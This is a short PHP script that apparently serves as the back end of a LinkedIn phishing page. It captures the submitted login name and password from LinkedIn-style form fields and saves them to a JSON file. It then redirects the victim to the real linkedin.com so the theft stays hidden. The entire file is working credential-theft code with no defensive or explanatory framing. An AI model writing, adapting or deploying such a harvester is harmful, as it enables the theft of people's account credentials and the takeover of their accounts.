<?php
$user = $_POST['session_key'];
$pass = $_POST['session_password'];
$data['dev'][] = array('username' =>$user,
'password'=>$pass);
$jdata = json_encode($data);
$f = fopen('usernames.json', 'w');
fwrite($f, $jdata);
fclose($f);
header('Location: https://linkedin.com');
exit();

